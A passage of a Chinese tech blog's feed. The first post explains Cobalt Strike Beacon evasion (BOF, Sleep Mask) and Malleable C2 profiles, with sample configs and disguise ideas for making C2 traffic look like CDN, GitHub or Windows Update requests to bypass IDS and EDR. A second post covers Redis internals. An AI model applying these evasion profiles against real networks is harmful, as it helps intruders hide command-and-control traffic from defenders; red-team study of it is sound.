+ Sleep Mask</th></tr></thead><tbody><tr><td>隐蔽性</td><td>一直驻留内存，容易被查</td><td>清空内存内容，动态恢复</td></tr><tr><td>落地风险</td><td>可能写入磁盘</td><td>完全内存中运行</td></tr><tr><td>检测风险</td><td>代码签名、模块名暴露</td><td>自定义格式、无标准模块</td></tr><tr><td>性能</td><td>稳定但占资源</td><td>轻量、只执行一次</td></tr></tbody></table><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li><strong>BOF</strong> 是 Beacon 内部运行的轻量模块插件，用 C 写，运行在内存中，无需落地；</li><li><strong>Sleep Mask</strong> 是一种在 sleep 期间隐藏自身代码的技术，防止内存扫描被发现；</li><li>两者结合，可以极大提升 Beacon 的隐蔽性，绕过杀软、EDR 检测；</li><li>是红队中期持久化阶段非常关键的能力。</li></ul><h1 id="Malleable-C2"><a href="#Malleable-C2" class="headerlink" title="Malleable C2"></a><strong>Malleable C2</strong></h1><h2 id="Malleable-C2：流量伪装引擎"><a href="#Malleable-C2：流量伪装引擎" class="headerlink" title="Malleable C2：流量伪装引擎"></a>Malleable C2：流量伪装引擎</h2><p>Malleable C2 是 Cobalt Strike 中用于<strong>自定义 Beacon 和 Team Server 通信流量外观</strong>的配置机制。它的核心目标是：</p><ul><li>让 C2 流量“看起来像正常流量”；</li><li>绕过 IDS&#x2F;WAF&#x2F;NDR 等基于流量模式的检测；</li><li>伪装成合法网站（CDN、API、更新服务等）。</li></ul><hr><h2 id="Malleable-C2-的工作原理"><a href="#Malleable-C2-的工作原理" class="headerlink" title="Malleable C2 的工作原理"></a>Malleable C2 的工作原理</h2><p>默认情况下，Beacon 的回连行为是固定的：</p><ul><li>请求路径：<code>/submit.php</code></li><li>User-Agent：<code>CobaltStrike Beacon</code></li><li>数据格式：Base64 编码后的任务包</li></ul><p>这太容易被规则匹配或流量学习算法检测了。</p><p>于是引入 <strong>profile 文件</strong>，可以修改 Beacon 请求的：</p><ul><li>URI、路径结构；</li><li>请求方法（GET&#x2F;POST）；</li><li>头部字段（User-Agent、Cookie、Referer 等）；</li><li>请求包体（格式、加密、混淆方式）；</li><li>响应内容（伪装为图像、JSON、HTML 页面）；</li><li>Beacon 的 metadata 加密、编码方式。</li></ul><hr><h2 id="一个简单的-profile-示例"><a href="#一个简单的-profile-示例" class="headerlink" title="一个简单的 profile 示例"></a>一个简单的 profile 示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;30000&quot;</span>;  <span class="comment">// 30 秒</span></span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/status&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;application/json&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            prepend <span class="string">&quot;ID=&quot;</span>;</span><br><span class="line">            base64;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段配置的含义是：</p><ul><li>Beacon 回连使用路径 <code>/api/status</code></li><li>使用的 User-Agent 是正常浏览器；</li><li>将 metadata 结构体用 netbios 编码、base64，再加个 ID&#x3D; 前缀；</li><li>Server 端的响应就直接打印出来（可自定义为图片等内容）。</li></ul><hr><h2 id="Malleable-C2-的几个重要块"><a href="#Malleable-C2-的几个重要块" class="headerlink" title="Malleable C2 的几个重要块"></a>Malleable C2 的几个重要块</h2><h3 id="1-http-get-http-post"><a href="#1-http-get-http-post" class="headerlink" title="1. http-get &amp; http-post"></a>1. <code>http-get</code> &amp; <code>http-post</code></h3><p>定义 Beacon 上线请求的行为（GET 请求）和命令执行结果上传行为（POST 请求）。</p><p>每个块中可配置：</p><ul><li><code>uri</code></li><li><code>client &#123;&#125;</code>：请求头部 &amp; 编码方式</li><li><code>server &#123;&#125;</code>：响应头部 &amp; 内容格式</li></ul><hr><h3 id="2-metadata、id-output-post-ex"><a href="#2-metadata、id-output-post-ex" class="headerlink" title="2. metadata、id, output, post-ex"></a>2. <code>metadata</code>、<code>id</code>, <code>output</code>, <code>post-ex</code></h3><p>这些是 Beacon 与 Team Server 通信时的几种数据类型：</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td><code>metadata</code></td><td>Beacon 上线时发给 C2 的信息（包括 hostname、user、IP、etc）</td></tr><tr><td><code>id</code></td><td>会话 ID，用来识别这个 Beacon</td></tr><tr><td><code>output</code></td><td>Beacon 执行命令后的返回数据</td></tr><tr><td><code>post-ex</code></td><td>Beacon 执行 post-ex 模块（像 shell、inject）后的数据</td></tr></tbody></table><p>这些字段支持加密、编码、混淆（xor、netbios、base64、prepend、append 等）。</p><hr><h3 id="3-http-stager-块（仅-staged-payload-使用）"><a href="#3-http-stager-块（仅-staged-payload-使用）" class="headerlink" title="3. http-stager 块（仅 staged payload 使用）"></a>3. <code>http-stager</code> 块（仅 staged payload 使用）</h3><p>定义最初那个 stager 的 HTTP 下载行为（即 Beacon 拉取 stage 时使用的请求样式）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/octet-stream&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;User-Agent&quot;</span> <span class="string">&quot;Mozilla/5.0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="怎么创建并使用-Malleable-C2-配置？"><a href="#怎么创建并使用-Malleable-C2-配置？" class="headerlink" title="怎么创建并使用 Malleable C2 配置？"></a>怎么创建并使用 Malleable C2 配置？</h2><ol><li>参考官方样例或 GitHub 上的 Malleable C2 Profile 集合；</li><li>使用工具检查合法性：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2lint my.profile</span><br></pre></td></tr></table></figure><ol><li>启动 teamserver 时加载 profile：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;IP&gt; &lt;pass&gt; my.profile</span><br></pre></td></tr></table></figure><hr><h2 id="实战中常用的伪装思路"><a href="#实战中常用的伪装思路" class="headerlink" title="实战中常用的伪装思路"></a>实战中常用的伪装思路</h2><table><thead><tr><th>模拟对象</th><th>方法</th></tr></thead><tbody><tr><td>CDN（Cloudflare）</td><td>使用 <code>/cdn-cgi/l/email-protection</code><br/>、图片资源路径</td></tr><tr><td>GitHub API</td><td>使用 <code>https://api.github.com/repos/...</code><br/> 结构</td></tr><tr><td>Microsoft Update</td><td>模拟 <code>User-Agent: Windows-Update-Agent</code><br/>，路径带 <code>.cab</code></td></tr><tr><td>Google Fonts</td><td>路径 <code>/fonts?family=Roboto</code><br/>，响应为 JSON 或 CSS</td></tr><tr><td>JSON API</td><td>请求头 Accept 为 <code>application/json</code><br/>，response 返回 JSON 结构包住 output</td></tr><tr><td>图片资源</td><td>响应用 <code>Content-Type: image/jpeg</code><br/>，output 藏在图片尾部或 fake jpg header 后</td></tr></tbody></table><hr><h1 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h1><p>在 Cobalt Strike 中，<strong>profile 指的就是 Malleable C2 的配置文件</strong>，它是用一种特殊的 DSL（类似 C 的语法）写的文本文件，<strong>用来定义 Beacon 和 Team Server 通信时的“外壳伪装”</strong>。</p><p>通俗一点说：</p><p>Beacon 的流量要伪装成“正常的网络请求”，profile 就是这张“伪装成什么样”的说明书。</p><p>比如：</p><ul><li>要把流量伪装成访问 GitHub 的样子？</li><li>要让流量头部看起来像浏览器请求？</li><li>要让传输内容长得像图片？ 这些都可以在 profile 里配置。</li></ul><hr><h2 id="Profile-的作用总结起来就是两点："><a href="#Profile-的作用总结起来就是两点：" class="headerlink" title="Profile 的作用总结起来就是两点："></a>Profile 的作用总结起来就是两点：</h2><ol><li><strong>定义 Beacon 与 Team Server 的通信格式（数据结构 + 包样式）</strong>；</li><li><strong>控制 Beacon 的行为参数（上线频率、jitter 抖动、user-agent、请求路径等）</strong>。</li></ol><hr><h2 id="Profile-通常包含哪些内容"><a href="#Profile-通常包含哪些内容" class="headerlink" title="Profile 通常包含哪些内容"></a>Profile 通常包含哪些内容</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;60000&quot;</span>;             <span class="comment">// Beacon 心跳时间（毫秒）</span></span><br><span class="line"><span class="built_in">set</span> jitter <span class="string">&quot;25&quot;</span>;                   <span class="comment">// 抖动百分比</span></span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0&quot;</span>;       <span class="comment">// Beacon 使用的 User-Agent</span></span><br><span class="line"><span class="built_in">set</span> dns_idle <span class="string">&quot;8.8.8.8&quot;</span>;            <span class="comment">// DNS Beacon 模式用的 Idle 值</span></span><br><span class="line"><span class="built_in">set</span> maxdns <span class="string">&quot;255&quot;</span>;                  <span class="comment">// 最大 DNS 包长度</span></span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/cdn/api/status&quot;</span>;     <span class="comment">// Beacon GET 请求的路径</span></span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;application/json&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend <span class="string">&quot;ID=&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一个完整的通信逻辑描述文件。</p><hr><h2 id="Profile-的生命周期是这样的："><a href="#Profile-的生命周期是这样的：" class="headerlink" title="Profile 的生命周期是这样的："></a>Profile 的生命周期是这样的：</h2><ol><li><strong>创建：</strong> 自己手写或用工具生成 profile 文件，后缀不限（通常 <code>.profile</code>）；</li><li><strong>加载：</strong> 启动 Cobalt Strike 的 TeamServer 时传入这个文件；</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;IP&gt; &lt;password&gt; profile.profile</span><br></pre></td></tr></table></figure><ol start="3"><li><strong>作用：</strong> 所有 Beacon（包括生成的 payload）都会使用该 profile 定义的行为来回连；</li><li><strong>修改：</strong> 必须重启 TeamServer 才能生效新的 profile。</li></ol><hr><h2 id="Profile-和-Beacon-是什么关系"><a href="#Profile-和-Beacon-是什么关系" class="headerlink" title="Profile 和 Beacon 是什么关系"></a>Profile 和 Beacon 是什么关系</h2><p>可以这样理解：</p><table><thead><tr><th>模块</th><th>作用</th></tr></thead><tbody><tr><td>Beacon</td><td>负责执行命令 + 回连 Team Server</td></tr><tr><td>Profile</td><td>规定 Beacon 的“通信外壳”和行为习惯</td></tr><tr><td>Team Server</td><td>接收 Beacon 的流量，并解析 profile 中规定的结构</td></tr></tbody></table><hr><h2 id="可以配置哪些行为"><a href="#可以配置哪些行为" class="headerlink" title="可以配置哪些行为"></a>可以配置哪些行为</h2><table><thead><tr><th>行为类型</th><th>示例</th></tr></thead><tbody><tr><td>回连频率</td><td><code>set sleeptime</code>、<code>set jitter</code></td></tr><tr><td>请求样式</td><td><code>http-get &#123;&#125;</code>、<code>http-post &#123;&#125;</code></td></tr><tr><td>请求内容</td><td><code>metadata</code>、<code>id</code>、<code>post-ex</code></td></tr><tr><td>数据编码</td><td><code>base64</code>、<code>netbios</code>、<code>mask</code></td></tr><tr><td>流量伪装</td><td><code>header</code>、<code>uri</code>、<code>server output</code></td></tr><tr><td>DNS 通信</td><td><code>dns-beacon</code>、<code>maxdns</code>、<code>dns_idle</code></td></tr><tr><td>兼容场景</td><td><code>os_arch</code>、<code>http-stager</code> 块</td></tr></tbody></table><hr><h2 id="实战中怎么用-profile"><a href="#实战中怎么用-profile" class="headerlink" title="实战中怎么用 profile"></a>实战中怎么用 profile</h2><ul><li>配合上线场景：伪装成公司常访问的 API（CDN、云盘等）；</li><li>绕过 IDS&#x2F;EDR：改掉 Beacon 的默认路径、头部、包结构；</li><li>针对性生成 payload：一个 profile 一个 Beacon 风格。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;C2基础&quot;&gt;&lt;a href=&quot;#C2基础&quot; class=&quot;headerlink&quot; title=&quot;C2基础&quot;&gt;&lt;/a&gt;C2基础&lt;/h1&gt;&lt;h2 id=&quot;什么是-C2-框架&quot;&gt;&lt;a href=&quot;#什么是-C2-框架&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="C2" scheme="https://lyi61pd.github.io/tags/C2/"/>
    
    <category term="安全" scheme="https://lyi61pd.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Redis</title>
    <link href="https://lyi61pd.github.io/2025/04/03/Redis/"/>
    <id>https://lyi61pd.github.io/2025/04/03/Redis/</id>
    <published>2025-04-03T00:00:00.000Z</published>
    <updated>2025-07-30T03:40:55.100Z</updated>
    
    <content type="html"><![CDATA[<h1 id="I-O多路复用是什么"><a href="#I-O多路复用是什么" class="headerlink" title="I&#x2F;O多路复用是什么"></a>I&#x2F;O多路复用是什么</h1><p><strong>I&#x2F;O 多路复用</strong>（I&#x2F;O Multiplexing）是一种使得单个线程（或进程）能够同时监控多个 I&#x2F;O 操作的技术，它可以让程序有效地处理多个 I&#x2F;O 操作（如读取文件或网络连接）而无需为每个操作创建一个独立的线程或进程。I&#x2F;O 多路复用的核心思想是在一个线程内，能够同时处理多个 I&#x2F;O 操作，避免了频繁的线程切换和进程创建，从而提高了系统的性能和资源利用率。</p><p>在没有 I&#x2F;O 多路复用机制的情况下，当程序需要等待多个 I&#x2F;O 操作时（比如等待多个网络连接的读取操作），通常会采取阻塞方式，直到每个操作完成。这样每个操作都会阻塞当前线程，导致系统资源浪费。I&#x2F;O 多路复用通过在一个线程内同时监听多个 I&#x2F;O 操作，使得线程在等待 I&#x2F;O 操作完成时可以继续做其他工作。</p><h2 id="I-O-多路复用的工作原理"><a href="#I-O-多路复用的工作原理" class="headerlink" title="I&#x2F;O 多路复用的工作原理"></a>I&#x2F;O 多路复用的工作原理</h2><p>I&#x2F;O 多路复用的基本原理是，程序通过一个系统调用（如 <code>select</code>、<code>poll</code>、<code>epoll</code> 等）将多个文件描述符注册到内核中，内核在这些文件描述符上的 I&#x2F;O 事件发生时通知程序。程序通过查询这些文件描述符的状态，确定哪些可以进行读写操作。</p><p>具体流程如下：</p><ol><li><strong>注册文件描述符</strong>：应用程序通过某种方式（如 <code>select</code>、<code>poll</code>、<code>epoll</code> 等）将需要监控的文件描述符注册到操作系统内核。</li><li><strong>等待 I&#x2F;O 事件</strong>：应用程序进入等待状态，等待内核通知哪些文件描述符有事件（例如数据可读、可写或异常）。</li><li><strong>事件发生时处理 I&#x2F;O 操作</strong>：一旦某个文件描述符有 I&#x2F;O 事件发生，内核会通知程序，程序可以读取或写入数据，或处理相应的 I&#x2F;O 操作。</li><li><strong>重复等待</strong>：程序处理完事件后，继续进入等待状态，直到下一个事件发生。</li></ol><h2 id="为什么需要-I-O-多路复用？"><a href="#为什么需要-I-O-多路复用？" class="headerlink" title="为什么需要 I&#x2F;O 多路复用？"></a>为什么需要 I&#x2F;O 多路复用？</h2><p>I&#x2F;O 多路复用的目标是提高并发性和系统性能，尤其是在以下几种场景下：</p><ol><li><strong>高并发</strong>：当需要同时处理大量 I&#x2F;O 操作（比如网络请求、文件操作等）时，创建一个线程或进程来处理每个请求可能会消耗大量系统资源，而 I&#x2F;O 多路复用通过共享一个线程来处理多个 I&#x2F;O 操作，大大减少了资源消耗。</li><li><strong>减少阻塞</strong>：传统的 I&#x2F;O 操作通常是阻塞的，程序会一直等待 I&#x2F;O 操作完成，直到可以读取或写入数据。而 I&#x2F;O 多路复用使得程序在等待 I&#x2F;O 操作时不会被阻塞，可以同时处理多个 I&#x2F;O 请求，提高效率。</li><li><strong>资源节省</strong>：通过单线程处理多个 I&#x2F;O 操作，可以避免过多的线程或进程创建，从而节省系统资源，减少上下文切换的开销。</li></ol><h2 id="I-O-多路复用的典型技术"><a href="#I-O-多路复用的典型技术" class="headerlink" title="I&#x2F;O 多路复用的典型技术"></a>I&#x2F;O 多路复用的典型技术</h2><p>I&#x2F;O 多路复用的实现方式依赖于操作系统提供的系统调用，常见的实现技术包括：</p><ol><li><code>**select**</code>：<ul><li>最早期的 I&#x2F;O 多路复用机制，允许程序监控多个文件描述符，判断哪些文件描述符已经准备好进行读写操作。</li><li><code>select</code> 通过传递文件描述符集合来实现，每次调用都会检查所有文件描述符的状态，因此在大量文件描述符的情况下性能会变差。</li><li>受限于文件描述符数量（通常是 1024）。</li></ul></li><li><code>**poll**</code>：<ul><li>类似于 <code>select</code>，但解决了 <code>select</code> 的一些局限，比如文件描述符数量的限制。</li><li><code>poll</code> 使用一个数组来存储文件描述符和事件，能处理任意数量的文件描述符，但性能仍然随着文件描述符数量的增加而降低。</li></ul></li><li><code>**epoll**</code>：<ul><li>Linux 下提供的高效 I&#x2F;O 多路复用机制，特别适用于处理大量并发连接。</li><li><code>epoll</code> 使用事件驱动的方式，只关注那些发生事件的文件描述符，避免了不必要的检查和遍历，从而提高了性能。</li><li>支持边缘触发（ET）和水平触发（LT）模式，能够更精确地控制 I&#x2F;O 事件。</li><li><code>epoll</code> 有两种工作模式：</li></ul><ol><li><strong>水平触发（Level Triggered，LT）</strong>：<ul><li>当某个文件描述符有数据可读时，<code>epoll</code> 会通知用户程序。如果程序没有读走所有数据，它会继续通知直到数据被完全读取。</li></ul></li><li><strong>边缘触发（Edge Triggered，ET）</strong>：<ul><li>当某个文件描述符的状态从不可读变为可读时，<code>epoll</code> 会通知用户程序。只有当文件描述符的状态发生变化时，<code>epoll</code> 才会触发通知。相比于 LT 模式，ET 模式需要程序更精细地处理数据。</li></ul></li></ol></li><li><code>**kqueue**</code>（在 BSD 系统中）：<ul><li>类似于 <code>epoll</code>，是 BSD 系统（如 macOS）中的 I&#x2F;O 多路复用机制。<code>kqueue</code> 能高效地监控多个 I&#x2F;O 事件，支持灵活的事件处理机制。</li></ul></li></ol><h2 id="I-O-多路复用的优缺点"><a href="#I-O-多路复用的优缺点" class="headerlink" title="I&#x2F;O 多路复用的优缺点"></a>I&#x2F;O 多路复用的优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li><strong>高并发处理</strong>：在单线程或少量线程中处理多个 I&#x2F;O 操作，避免了线程和进程切换的开销，能处理更多的并发请求。</li><li><strong>节省资源</strong>：减少了线程和进程的创建和销毁，避免了过多的资源消耗。</li><li><strong>避免阻塞</strong>：通过非阻塞的 I&#x2F;O 操作，程序能够在等待数据时继续执行其他任务，提升系统响应能力。</li></ol><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li><strong>实现复杂</strong>：相比传统的阻塞式 I&#x2F;O，I&#x2F;O 多路复用需要处理更多的复杂性，如事件的管理和响应。</li><li><strong>适用场景有限</strong>：虽然 I&#x2F;O 多路复用适用于高并发场景，但它对于一些不需要处理大量并发的简单应用来说可能过于复杂。</li><li><strong>系统依赖性</strong>：不同操作系统提供的 I&#x2F;O 多路复用机制（如 <code>select</code>、<code>poll</code>、<code>epoll</code>）有差异，可能需要考虑跨平台的适配问题。</li></ol><hr><h1 id="redis都有哪些数据结构"><a href="#redis都有哪些数据结构" class="headerlink" title="redis都有哪些数据结构"></a>redis都有哪些数据结构</h1><p>Redis 提供了多种数据结构，旨在帮助开发者高效地存储和操作不同类型的数据。每种数据结构在 Redis 中都扮演着不同的角色，针对特定的应用场景进行优化。以下是 Redis 支持的主要数据结构：</p><h2 id="1-String（字符串）"><a href="#1-String（字符串）" class="headerlink" title="1. String（字符串）"></a>1. String（字符串）</h2><ul><li><strong>描述</strong>：Redis 中的基本数据类型，可以存储任何类型的字符串，包括数字、文本、二进制数据等。</li><li><strong>特点</strong>：<ul><li>每个键值对中的值都是一个字符串，最大长度为 512 MB。</li><li>支持常见的字符串操作，如设置、获取、拼接、截取等。</li><li>用途广泛，适合存储缓存、会话信息、计数器等。</li></ul></li><li><strong>常见操作</strong>：<ul><li><code>SET key value</code>：设置键值对。</li><li><code>GET key</code>：获取键对应的值。</li><li><code>INCR key</code>：对值进行加 1 操作（计数器）。</li></ul></li></ul><h2 id="2-List（列表）"><a href="#2-List（列表）" class="headerlink" title="2. List（列表）"></a>2. List（列表）</h2><ul><li><strong>描述</strong>：一个简单的字符串列表，按照插入顺序排序，可以在列表的两端进行推送、弹出等操作。</li><li><strong>特点</strong>：<ul><li>支持从左侧或右侧操作（即双端队列）。</li><li>适合队列、栈等数据模型。</li><li>支持基于索引的访问和范围查询。</li></ul></li><li><strong>常见操作</strong>：<ul><li><code>LPUSH key value</code>：将值推入列表的左端。</li><li><code>RPUSH key value</code>：将值推入列表的右端。</li><li><code>LPOP key</code>：从左侧弹出一个元素。</li><li><code>RPOP key</code>：从右侧弹出一个元素。</li><li><code>LRANGE key start stop</code>：返回列表指定范围内的元素。</li></ul></li></ul><h2 id="3-Set（集合）"><a href="#3-Set（集合）" class="headerlink" title="3. Set（集合）"></a>3. Set（集合）</h2><ul><li><strong>描述</strong>：无序的字符串集合，集合中的元素是唯一的，没有重复值。</li><li><strong>特点</strong>：<ul><li>支持集合操作，如交集、并集和差集等。</li><li>适合用来存储不允许重复的数据。</li><li>常用于标签、集合运算等。</li></ul></li><li><strong>常见操作</strong>：<ul><li><code>SADD key member</code>：将成员添加到集合中。</li><li><code>SREM key member</code>：移除集合中的成员。</li><li><code>SMEMBERS key</code>：返回集合中的所有成员。</li><li><code>SINTER key1 key2</code>：返回两个集合的交集。</li></ul></li></ul><h2 id="4-Sorted-Set（有序集合）"><a href="#4-Sorted-Set（有序集合）" class="headerlink" title="4. Sorted Set（有序集合）"></a>4. Sorted Set（有序集合）</h2><ul><li><strong>描述</strong>：与 Set 类似，但每个元素都有一个分数（score），根据分数进行排序。</li><li><strong>特点</strong>：<ul><li>元素按照分数从小到大排序，且分数相同的元素会按照插入顺序排序。</li><li>支持范围查询，可以根据分数范围进行查询，适用于排行榜、延迟队列等场景。</li></ul></li><li><strong>常见操作</strong>：<ul><li><code>ZADD key score member</code>：将元素及其分数添加到有序集合中。</li><li><code>ZRANGE key start stop</code>：返回指定区间内的元素。</li><li><code>ZREM key member</code>：移除有序集合中的成员。</li><li><code>ZRANK key member</code>：返回成员的排名。</li></ul></li></ul><h2 id="5-Hash（哈希）"><a href="#5-Hash（哈希）" class="headerlink" title="5. Hash（哈希）"></a>5. Hash（哈希）</h2><ul><li><strong>描述</strong>：键值对集合，适合存储对象类型的数据。哈希可以通过字段（field）来存储多个值。</li><li><strong>特点</strong>：<ul><li>每个哈希可以包含多个字段和相应的值，类似于一个对象或记录。</li><li>适合存储多个关联字段的数据（例如，用户信息）。</li></ul></li><li><strong>常见操作</strong>：<ul><li><code>HSET key field value</code>：为哈希添加一个字段和值。</li><li><code>HGET key field</code>：获取哈希中指定字段的值。</li><li><code>HGETALL key</code>：获取哈希中的所有字段和值。</li><li><code>HDEL key field</code>：删除哈希中的指定字段。</li></ul></li></ul><h2 id="6-Bitmaps（位图）"><a href="#6-Bitmaps（位图）" class="headerlink" title="6. Bitmaps（位图）"></a>6. Bitmaps（位图）</h2><ul><li><strong>描述</strong>：位图是对字符串类型的一种扩展，可以将字符串的每一位作为一个独立的 bit（0 或 1）来使用。</li><li><strong>特点</strong>：<ul><li>适用于高效的布尔值集合操作，比如用户是否参与活动。</li><li>可以在不需要额外内存的情况下存储大量的布尔值。</li></ul></li><li><strong>常见操作</strong>：<ul><li><code>SETBIT key offset value</code>：在指定位置设置位值。</li><li><code>GETBIT key offset</code>：获取指定位置的位值。</li><li><code>BITCOUNT key</code>：统计指定键中为 1 的位数。</li></ul></li></ul><h2 id="9-Streams（流）"><a href="#9-Streams（流）" class="headerlink" title="9. Streams（流）"></a>9. Streams（流）</h2><ul><li><strong>描述</strong>：Redis Streams 是一个类似消息队列的数据结构，用于存储和处理消息流。</li><li><strong>特点</strong>：<ul><li>支持按时间戳存储消息，并支持消费者组（Consumer Groups）。</li><li>可用于构建类似 Kafka 的消息队列系统。</li></ul></li><li><strong>常见操作</strong>：<ul><li><code>XADD key * field value</code>：向流中添加一条消息。</li><li><code>XREAD</code>：从流中读取消息。</li><li><code>XGROUP CREATE</code>：创建消费者组。</li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Redis 提供了非常丰富和高效的数据结构，适用于各种不同的使用场景。根据不同的需求，你可以选择合适的数据结构来存储和处理数据：</p><ul><li><strong>String</strong>：适用于缓存、计数器等简单数据。</li><li><strong>List</strong>：适合队列、栈等线性数据。</li><li><strong>Set</strong>：用于去重、集合操作等。</li><li><strong>Sorted Set</strong>：适合排行榜、延迟队列等按顺序操作的数据。</li><li><strong>Hash</strong>：适合存储对象或多字段的数据。</li><li><strong>Bitmaps</strong>：适用于位级操作。</li><li><strong>Streams</strong>：适用于消息队列等场景。</li></ul><p>这些数据结构可以帮助开发者根据实际需求进行灵活的设计与优化，使得 Redis 成为一个非常强大的数据存储系统。</p><table><thead><tr><th>类型</th><th>特点</th><th>场景</th></tr></thead><tbody><tr><td>String</td><td>快速简单，最大512MB</td><td>缓存单值、计数器、Token</td></tr><tr><td>Hash</td><td>结构体对象存储</td><td>用户信息、配置项</td></tr><tr><td>List</td><td>有序双向链表</td><td>消息队列、日志</td></tr><tr><td>Set</td><td>无序唯一集合</td><td>去重、标签、集合运算</td></tr><tr><td>ZSet</td><td>有序集合，带权重</td><td>排行榜、延迟队列</td></tr></tbody></table><hr><h1 id="Redis-是单线程的，为什么还能这么快？单线程不是慢吗？"><a href="#Redis-是单线程的，为什么还能这么快？单线程不是慢吗？" class="headerlink" title="Redis 是单线程的，为什么还能这么快？单线程不是慢吗？"></a>Redis 是单线程的，为什么还能这么快？单线程不是慢吗？</h1><ol><li>所有数据在内存中，访问没有磁盘 IO</li><li>单线程模型，避免上下文切换和加锁开销</li><li>基于 epoll 的 IO 多路复用，处理高并发连接</li><li>简单高效的数据结构（C实现 + ziplist&#x2F;intset优化）</li></ol><hr><h1 id="Redis的过期机制和内存淘汰策略"><a href="#Redis的过期机制和内存淘汰策略" class="headerlink" title="Redis的过期机制和内存淘汰策略"></a>Redis的过期机制和内存淘汰策略</h1><h2 id="一、Key-的过期机制（TTL）"><a href="#一、Key-的过期机制（TTL）" class="headerlink" title="一、Key 的过期机制（TTL）"></a>一、Key 的过期机制（TTL）</h2><p>Redis 支持设置每个 key 的<strong>过期时间</strong>，到时间后自动删除。</p><h3 id="🔹设置过期时间的命令"><a href="#🔹设置过期时间的命令" class="headerlink" title="🔹设置过期时间的命令"></a>🔹设置过期时间的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET user:1 <span class="string">&quot;Tom&quot;</span> EX 60     <span class="comment"># 设置 60 秒后过期</span></span><br><span class="line">EXPIRE user:1 60           <span class="comment"># 单独设置过期时间</span></span><br><span class="line">TTL user:1                 <span class="comment"># 查询剩余时间</span></span><br></pre></td></tr></table></figure><h3 id="Redis-什么时候删除这些-key？"><a href="#Redis-什么时候删除这些-key？" class="headerlink" title="Redis 什么时候删除这些 key？"></a>Redis 什么时候删除这些 key？</h3><p>重点：<strong>不是精确时钟删除，而是惰性 + 定期删除机制组合</strong></p><h3 id="删除策略详解"><a href="#删除策略详解" 